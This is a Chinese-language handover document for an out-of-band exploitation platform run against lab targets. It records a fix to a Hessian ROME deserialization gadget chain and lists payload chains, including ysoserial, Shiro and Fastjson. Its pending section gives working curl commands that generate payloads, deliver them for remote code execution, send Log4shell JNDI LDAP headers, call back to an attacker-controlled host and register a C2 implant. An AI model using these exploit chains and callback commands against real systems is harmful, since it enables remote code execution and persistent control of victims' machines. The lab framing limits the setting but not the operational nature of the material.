# OOBserver-Next 交接文档

**日期**: 2026-04-26  
**项目**: OOBserver-Next — OOB 漏洞利用平台  

---

## 环境信息

| 角色 | IP | 说明 |
|------|----|------|
| CT1 攻击机 | `10.0.7.25` | OOBserver + bytecode sidecar |
| CT2 靶机 | `10.0.7.26` | 运行 3 个漏洞服务 |

### CT1 服务

| 服务 | 端口 | 说明 |
|------|------|------|
| bytecode-service | `8711` | exploit chain payload 生成（systemd service） |
| FastAPI 后端 | `8010` | OOBserver API + OOB 回调接收 |
| HTTP OOB 收集器 | `8015` | 接收 OOB HTTP 回调 |
| LDAP 监听 | `1389` | JNDI/Log4shell 触发用 |
| RMI 监听 | `1099` | RMI 反序列化触发用 |

### CT2 靶机服务

| 端口 | 服务 | 漏洞 |
|------|------|------|
| `8888` | vulnlab-app | Hessian 反序列化 (`POST /hessian`) |
| `8081` | log4shell-app | Log4j 2.14.1 JNDI (`${jndi:...}`) |
| `8082` | shiro-cbc | Shiro 1.2.4 rememberMe AES-CBC |

---

## 已完成内容

### 1. Hessian 链 bug 修复（核心）

**问题**: `HessianChainHandler.buildRomeTemplatesGadget()` 用 `HashSet` 作外层容器。Hessian 反序列化 HashSet 走 `UnsafeDeserializer`（直接写 backing table），不调用 `hashCode()`，链不触发。

**修复**: 改为 `HashMap`。Hessian 反序列化 HashMap 走 `MapDeserializer`，调用 `put(k,v)` → `k.hashCode()` → 触发 ROME EqualsBean 链 → TemplatesImpl → RCE。

**部署方式**:
- CT1 sidecar 是 systemd service（`bytecode-sidecar.service`），非 Docker
- JAR 路径: `/opt/oobserver-next/bytecode-service/bytecode-service-0.1.0.jar`
- 修复后 payload 大小: 1153 → **1180 bytes**（变化即确认生效）

### 2. Payload 生成验证（CT1 sidecar）

全部 HTTP 200，payload 大小正常：

| Chain | Size(B) | 类型 |
|-------|---------|------|
| `hessian1_rome` | 1180 | Hessian1 二进制 |
| `hessian2_rome` | 1136 | Hessian2 二进制 |
| `shiro_cbc` | 1728 | Base64 cookie |
| `shiro_gcm` | 1744 | Base64 cookie |
| `xstream_eventhandler` | 416 | XML |
| `fastjson_jdbcrowset` | 108 | JSON |
| `c3p0_jndi` | 4997 | Java 序列化 |
| `ysoserial_cc6` | 1275 | Java 序列化 |
| `ysoserial_spring1` | 3445 | Java 序列化 |
| `ysoserial_cb1` | 2765 | Java 序列化 |
| `custom_bytecode` | 474 | `.class` |

---

## 待完成：真实 RCE 验证

以下测试需要你在 CT2 内或通过可达 CT2 的主机执行。

### Chain 1: Hessian1 ROME → CT2:8888

```bash
# 1. 生成 payload（替换 cmd 为你的命令）
curl -s -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"hessian1_rome","params":{"cmd":"id > /tmp/pwned_h1.txt && curl http://10.0.7.25:8015/callback/http/hessian1-rce"}}' \
  | python3 -c "import sys,json,base64; open('h1.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

# 2. 发送到 CT2
curl -X POST http://10.0.7.26:8888/hessian \
  -H "Content-Type: x-application/hessian" \
  --data-binary @h1.bin

# 3. 验证（在 CT2 上）
cat /tmp/pwned_h1.txt
# 或在 CT1 OOBserver 后台查看 callback 记录
```

### Chain 2: Hessian2 ROME → CT2:8888

```bash
curl -s -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"hessian2_rome","params":{"cmd":"id > /tmp/pwned_h2.txt"}}' \
  | python3 -c "import sys,json,base64; open('h2.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -X POST http://10.0.7.26:8888/hessian \
  -H "Content-Type: x-application/hessian2" \
  --data-binary @h2.bin
```

### Chain 3: Shiro CBC → CT2:8082

```bash
COOKIE=$(curl -s -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"shiro_cbc","params":{"cmd":"id > /tmp/pwned_shiro.txt"}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

curl -v http://10.0.7.26:8082/login \
  -H "Cookie: rememberMe=$COOKIE"
```

### Chain 4: Log4shell → CT2:8081

```bash
# CT1 LDAP(1389) 需要有对应的 JNDI exploit class
curl http://10.0.7.26:8081/ \
  -H 'User-Agent: ${jndi:ldap://10.0.7.25:1389/Exploit}' \
  -H 'X-Forwarded-For: ${jndi:ldap://10.0.7.25:1389/log4shell}'
```

### Chain 5: C2 Agent 上线

```bash
# 1. 通过 OOBserver 后端创建 token（需先登录获取 JWT）
JWT=$(curl -s -X POST http://10.0.7.25:8010/api/auth/login \
  -d "username=admin&password=<your_pass>" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. 创建 C2 token
curl -s -X POST http://10.0.7.25:8010/api/tokens \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"project_id":1,"label":"c2-test","protocols":["http"],"intent":"c2"}'

# 3. 生成 implant payload（根据 OOBserver C2 模块的 API）
# 4. 在 CT2 执行后，在 CT1 OOBserver 后台查看上线记录
```

---

## 已知问题

| 问题 | 说明 |
|------|------|
| 前端 Nginx(:80) 未运行 | API(:8010) 和 sidecar(:8711) 正常，前端需单独启动 |
| Log4shell 需配合 LDAP exploit class | CT1 LDAP 监听需提前注册好 JNDI class |
| `jndi_ldap_deserialize` chain 返回空 | Chain 注册有误，暂不可用 |
| Hessian payload 验证方式 | Hessian 序列化 HashMap 用 `M` 无类名标记，不含 "HashMap" 字符串，需看 payload size(1180) 或 javap 确认 |

---

## 快速验证 sidecar 存活

```bash
curl http://10.0.7.25:8711/chains  # 返回 72 条 chain ID 列表
curl -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"hessian1_rome","params":{"cmd":"id"}}' | python3 -c \
  "import sys,json; r=json.load(sys.stdin); print('OK size='+str(len(__import__('base64').b64decode(r['value']))))"
# 期望: OK size=1180
```
